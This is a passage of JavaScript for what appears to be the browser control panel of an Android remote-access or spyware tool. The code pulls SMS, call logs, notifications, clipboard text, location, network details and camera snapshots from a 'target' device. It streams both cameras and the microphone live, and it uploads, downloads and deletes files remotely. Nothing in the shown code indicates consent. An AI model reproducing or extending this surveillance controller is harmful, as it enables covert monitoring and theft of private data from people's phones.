      const binary = String.fromCharCode.apply(null, new Uint8Array(slice));
      const base64 = btoa(binary);

      socket.emit('fs:upload_chunk', {
        to: androidClientId,
        chunk: base64
      });

      const pct = Math.floor(((idx + 1) / totalChunks) * 100);
      fsUploadProgress.style.width = `${pct}%`;
      fsUploadLabel.textContent = `Uploading ${file.name}... (${pct}%)`;

      await new Promise(r => setTimeout(r, 10));
    }

    socket.emit('fs:upload_complete', { to: androidClientId });
    fsUploadLabel.textContent = 'Upload Completed successfully';
    logDebug(`[FS] File upload assembled on device: ${file.name}`);
    setTimeout(() => {
      fsUploadLabel.textContent = 'Drag files here or click to upload to current directory';
      fsUploadProgress.style.width = '0%';
    }, 4000);
  };

  reader.readAsArrayBuffer(file);
}

// ─────────────────────────────────────────────────────────────
// WebSocket event subscriptions (replaces Socket.IO handlers)
// ─────────────────────────────────────────────────────────────

socket.on('connect', () => {
  updateStatus('Connected to Command server');
});

socket.on('connect_error', () => {
  updateStatus('Failed to connect to signaling host');
});

socket.on('disconnect', () => {
  updateStatus('Disconnected from Command server');
});

socket.on('id', (id) => {
  myId = id;
  logDebug(`Authenticated session ID: ${myId}`);
  // No need to re-emit "identify" or "web-client-ready" — the SignalingWebSocket
  // shim sends "identify" automatically on connection, and the server responds
  // with the ID and the list of already-connected Android clients.
});

socket.on('android-client-ready', (id) => {
  if (androidClientId !== id) {
    androidClientId = id;
    logDebug(`Android Client Target identified: ${id}`);
    updateStatus('Session established with device');
    requestFileList(currentPath);
  }
});

socket.on('device_info', (info) => {
  logDebug('Received telemetry profile');

  if (info.model) infoModel.textContent = info.model;
  if (info.manufacturer) infoManufacturer.textContent = info.manufacturer;
  if (info.version) infoVersion.textContent = `Android ${info.version}`;

  if (info.battery !== undefined) {
    infoBattery.textContent = `${info.battery}%`;
    if (info.battery <= 15) {
      infoBattery.style.color = 'var(--danger)';
    } else if (info.battery <= 35) {
      infoBattery.style.color = 'var(--warning)';
    } else {
      infoBattery.style.color = 'var(--success)';
    }
  }

  if (info.batteryTemp !== undefined && info.chargingSource) {
    infoBatteryDetails.textContent = `${info.batteryTemp}°C • ${info.chargingSource}`;
  }

  if (info.storageTotal !== undefined && info.storageFree !== undefined) {
    const occupied = (info.storageTotal - info.storageFree).toFixed(1);
    storageText.textContent = `${occupied} GB / ${info.storageTotal} GB`;
    const pct = ((occupied / info.storageTotal) * 100).toFixed(0);
    storageProgress.style.width = `${pct}%`;
  }

  if (info.recording) {
    btnRecord.classList.add('active');
    btnRecord.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 10a1 1 0 011-1h4a1 1 0 011 1v4a1 1 0 01-1 1h-4a1 1 0 01-1-1v-4z"/></svg> Stop Rec`;
  } else {
    btnRecord.classList.remove('active');
    btnRecord.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"/></svg> Record MP4`;
  }
});

socket.on('notification', (data) => {
  if (data && data.notification) addNotification(data.notification);
});

socket.on('call_log', (data) => {
  if (data && data.call_logs) {
    callLogList.innerHTML = '';
    data.call_logs.forEach(addCallLog);
  }
});

socket.on('sms', (data) => {
  if (data && data.sms_messages) {
    smsList.innerHTML = '';
    data.sms_messages.forEach(addSmsMessage);
  }
});

socket.on('apps_list', (data) => {
  logDebug('Apps list profiles updated');
  if (data && data.apps) {
    appList.innerHTML = '';
    data.apps.forEach(app => {
      const item = document.createElement('div');
      item.className = 'data-item';
      item.innerHTML = `
        <div class="data-icon">📱</div>
        <div class="data-details">
          <div class="data-title">${escapeHtml(app.name)}</div>
          <div class="data-desc">${escapeHtml(app.package)} (v${escapeHtml(app.version)})</div>
        </div>
        <button class="btn-explorer btn-primary btn-launch-app" data-package="${escapeHtml(app.package)}" style="padding: 6px 12px; font-size: 0.75rem; box-shadow: none;">Launch</button>
      `;
      appList.appendChild(item);
    });

    appList.querySelectorAll('.btn-launch-app').forEach(btn => {
      btn.addEventListener('click', (e) => {
        if (!androidClientId) return;
        const pkg = e.target.getAttribute('data-package');
        logDebug(`[CMD] Request launch for application: ${pkg}`);
        socket.emit('cmd:launch_app', { to: androidClientId, packageName: pkg });
      });
    });
  }
});

socket.on('sensor_data', (data) => {
  if (data && data.sensors) {
    const s = data.sensors;
    if (s.lux !== undefined) sensorLux.textContent = `${s.lux.toFixed(0)} Lux`;
    if (s.proximity !== undefined) sensorProximity.textContent = s.proximity === 0.0 ? 'NEAR (0cm)' : 'FAR (normal)';
    if (s.accelX !== undefined) sensorAccel.textContent = `X:${s.accelX.toFixed(1)} Y:${s.accelY.toFixed(1)} Z:${s.accelZ.toFixed(1)}`;

    sensorHistory.push({
      lux: s.lux || 0,
      accelX: s.accelX || 0,
      accelY: s.accelY || 0,
      accelZ: s.accelZ || 0
    });
    while (sensorHistory.length > maxHistoryPoints) {
      sensorHistory.shift();
    }
    drawSensorChart();
  }
});

socket.on('network_info', (data) => {
  if (data && data.network) {
    const n = data.network;
    netSsid.textContent = n.ssid;
    netSpeed.textContent = `${n.linkSpeed} Mbps`;
    netIp.textContent = n.localIp;
    netRssi.textContent = `${n.rssi} dBm`;
    logDebug(`[NET] SSID=${n.ssid}, Strength=${n.rssi} dBm, Speed=${n.linkSpeed} Mbps`);
  }
});

socket.on('snapshot_data', (data) => {
  if (data && data.snapshot) {
    logDebug(`Received camera snapshot from: ${data.snapshot.camera}`);
    currentSnapshotBase64 = data.snapshot.image;
    snapshotPreview.src = `data:image/jpeg;base64,${currentSnapshotBase64}`;
    snapshotModal.classList.add('active');
  }
});

socket.on('clipboard_data', (data) => {
  if (data && data.clipboard !== undefined) {
    clipboardTextArea.value = data.clipboard;
    logDebug(`Clipboard sync completed`);
  }
});

socket.on('location', (data) => {
  if (data && data.latitude !== undefined) {
    updateMap(data.latitude, data.longitude);
  }
});

socket.on('fs:files', (data) => {
  logDebug('Refreshing explorer directory tree');
  if (data && data.file_list) {
    renderFileList(data.file_list.files, data.file_list.currentPath);
  }
});

socket.on('fs:delete_result', (data) => {
  if (!data) return;
  logDebug(`[FS] Delete operation result: ${data.success ? 'SUCCESS' : 'FAILED'} for path ${data.path}`);
  updateStatus(data.success ? 'Deleted file successfully' : 'Failed to delete target file');
  requestFileList(currentPath);
});

socket.on('fs:download_start', (data) => {
  if (!data) return;
  const { fileId, name, size, totalChunks } = data;
  logDebug(`[FS] Starting chunked download: ${name} (${formatBytes(size)})`);
  activeDownloads[fileId] = {
    name: name,
    buffer: new Array(totalChunks),
    totalChunks: totalChunks,
    receivedChunks: 0,
    startTime: Date.now()
  };
  updateStatus(`Downloading ${name} (0%)`);
});

socket.on('fs:download_chunk', (data) => {
  if (!data) return;
  const { fileId, chunkIndex, content } = data;
  const download = activeDownloads[fileId];
  if (download) {
    if (!download.buffer[chunkIndex]) {
      download.buffer[chunkIndex] = content;
      download.receivedChunks++;
    }
    const pct = Math.floor((download.receivedChunks / download.totalChunks) * 100);
    if (pct % 10 === 0) {
      updateStatus(`Downloading ${download.name} (${pct}%)`);
    }
  }
});

socket.on('fs:download_complete', (data) => {
  if (!data) return;
  const { fileId } = data;
  const download = activeDownloads[fileId];
  if (download) {
    logDebug(`[FS] File download assembled: ${download.name}`);
    updateStatus(`Writing stream data...`);

    const base64Complete = download.buffer.join('');
    downloadBase64File(base64Complete, download.name);

    const duration = ((Date.now() - download.startTime) / 1000).toFixed(1);
    updateStatus(`Completed ${download.name} in ${duration}s`);
    delete activeDownloads[fileId];
  }
});

socket.on('fs:download_error', (data) => {
  if (!data) return;
  const { fileId, error } = data;
  if (activeDownloads[fileId]) {
    updateStatus(`Download error: ${activeDownloads[fileId].name}`);
    delete activeDownloads[fileId];
  }
  logDebug(`[FS] Download fail: ${error}`);
});

function downloadBase64File(base64Data, fileName) {
  const linkSource = `data:application/octet-stream;base64,${base64Data}`;
  const downloadLink = document.createElement("a");
  downloadLink.href = linkSource;
  downloadLink.download = fileName;
  downloadLink.click();
}

socket.on('signal', async (data) => {
  if (!data) return;
  const { from, signal } = data;

  if (!androidClientId || androidClientId !== from) {
    androidClientId = from;
    updateStatus('Android device detected');
  }

  if (signal && signal.type === 'recording_status') {
    if (signal.active) {
      btnRecord.classList.add('active');
      btnRecord.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 10a1 1 0 011-1h4a1 1 0 011 1v4a1 1 0 01-1 1h-4a1 1 0 01-1-1v-4z"/></svg> Stop Rec`;
      logDebug(`Local recording started on device. Saving to: ${signal.file}`);
    } else {
      btnRecord.classList.remove('active');
      btnRecord.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"/></svg> Record MP4`;
      logDebug(`Local recording saved to: ${signal.file}`);
      requestFileList(currentPath);
    }
    return;
  }

  if (!peer) {
    logDebug('Initializing WebRTC RTCPeerConnection');
    try {
      peer = new RTCPeerConnection(rtcConfig);
      peer.addTransceiver('video', { direction: 'recvonly' });
      peer.addTransceiver('video', { direction: 'recvonly' });
      peer.addTransceiver('audio', { direction: 'recvonly' });

      peer.ontrack = (event) => {
  const track = event.track;
  const mid = event.transceiver ? event.transceiver.mid : null;
  console.log('Track received:', track.kind, track.id, 'mid:', mid);

  if (track.kind === 'audio') {
    audioTrack = track;
  } else if (track.kind === 'video') {
    // Match against both possible ID schemes (front_video OR front_camera)
    if (track.id === 'front_video' || track.id === 'front_camera') {
      frontVideoTrack = track;
    } else if (track.id === 'back_video' || track.id === 'back_camera') {
      backVideoTrack = track;
    } else {
      // Fallback: use transceiver mid ('0' = front, '1' = back)
      if (mid === '0' && !frontVideoTrack) {
        frontVideoTrack = track;
      } else if (mid === '1' && !backVideoTrack) {
        backVideoTrack = track;
      }
    }
  }
  updateStreams();
};

      peer.onicecandidate = e => {
        if (e.candidate) {
          socket.emit('signal', {
            to: from,
            from: myId,
            signal: { candidate: e.candidate }
          });
        }
      };

      peer.oniceconnectionstatechange = () => {
        updateStatus(`WebRTC: ${peer.iceConnectionState}`);
        if (peer.iceConnectionState === 'failed') {
          updateStatus('Connection failed. Refresh or retry.');
        }
      };
    } catch (err) {
      console.error('Failed to create peer connection:', err);
    }
  }

  try {
    if (signal && signal.type === 'offer') {
      await peer.setRemoteDescription(new RTCSessionDescription(signal));
      const answer = await peer.createAnswer();
      await peer.setLocalDescription(answer);
      socket.emit('signal', {
        to: from,
        from: myId,
        signal: { type: 'answer', sdp: answer.sdp }
      });
    } else if (signal && signal.candidate) {
      await peer.addIceCandidate(new RTCIceCandidate(signal.candidate));
    }
  } catch (err) {
    console.error('Signal parsing error:', err);
  }
});

socket.on('android-client-disconnected', () => {
  updateStatus('Android target disconnected');
  if (peer) {
    peer.close();
    peer = null;
    videoFront.srcObject = null;
    videoBack.srcObject = null;
  }
  tagFront.textContent = 'FRONT DISCONNECTED';
  tagFront.style.background = 'rgba(239, 68, 68, 0.15)';
  tagFront.style.color = 'var(--danger)';
  tagFront.style.borderColor = 'var(--danger)';

  tagBack.textContent = 'BACK DISCONNECTED';
  tagBack.style.background = 'rgba(239, 68, 68, 0.15)';
  tagBack.style.color = 'var(--danger)';
  tagBack.style.borderColor = 'var(--danger)';

  notificationsList.innerHTML = '';
  callLogList.innerHTML = '';
  smsList.innerHTML = '';
  if (marker) {
    marker.remove();
    marker = null;
  }
});

socket.on('error', (error) => {
  if (error && error.message) updateStatus(`Signal Error: ${error.message}`);
});

retryButton.addEventListener('click', reconnectSocket);

// Initialize
updateStatus('Connecting to signaling...');
initMap();
initSensorChart();
switchTab(tabNotifications, paneNotifications);
